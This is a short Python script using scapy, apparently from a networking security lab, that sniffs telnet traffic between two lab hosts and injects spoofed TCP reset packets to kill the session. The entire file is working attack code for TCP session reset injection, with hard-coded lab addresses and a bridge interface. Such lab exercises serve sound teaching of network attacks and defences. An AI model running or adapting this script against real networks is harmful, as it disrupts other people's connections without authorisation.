#!/usr/bin/env python3
from scapy.all import *
import sys


def spoof(pkt):
    old_tcp = pkt[TCP]
    
    ip = IP(src="10.9.0.5", dst="10.9.0.6")
    tcp = TCP(sport=23, dport=old_tcp.sport, flags="R", seq=old_tcp.ack)
    pkt = ip/tcp
    send(pkt, verbose=0)


myFilter = 'tcp and src host 10.9.0.6 and dst host 10.9.0.5 and dst port 23'

# sniff(filter=myFilter, prn=spoof) # Doesn't work for some reason
sniff(filter=myFilter, prn=spoof, store=0, iface="br-4b40c97b1673", promisc=True)
